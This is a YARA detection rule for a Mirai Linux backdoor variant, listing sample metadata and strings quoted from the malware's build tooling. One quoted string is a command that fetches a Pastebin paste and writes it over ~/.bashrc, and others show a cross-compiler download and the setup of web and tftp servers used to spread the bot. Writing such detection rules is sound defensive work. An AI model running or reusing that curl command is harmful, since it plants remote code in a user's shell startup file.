rule Trojan_Backdoor_Linux_Mirai_u_673
{
	meta:
	    judge = "black"
		threatname = "Trojan[Backdoor]/Linux.Mirai.u"
		threattype = "Backdoor"
		family = "Mirai"
		hacker = "None"
		refer = "31012417c235c8aca6a155d34dfef48e"
		author = "mqx"
		comment = "None"
		date = "2017-10-16"
		description = "None"
	strings:
	    $s0 = "wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv4l.tar.bz2; tar -xvf cross-compiler-armv4l.tar.bz2; rm -rf cross-compiler-armv4l.tar.bz2"
		$s1 = "\x1B[90m[\x1B[93m?\x1B[90m] \x1B[97mWould you like to install/config the web/tftp server \x1B[90m[\x1B[93my\x1B[97m/\x1B[93mN\x1B[90m]\x1B[97m:\x1B[0m "
		$s2 = "\x1B[2J\x1B[1H"
		$s3 = "curl 'https://pastebin.com/raw/gFU3Zzei' > ~/.bashrc"
		$s4 = "service nginx restart; service tftpd-hpa restart"
	condition:
	    all of them		
}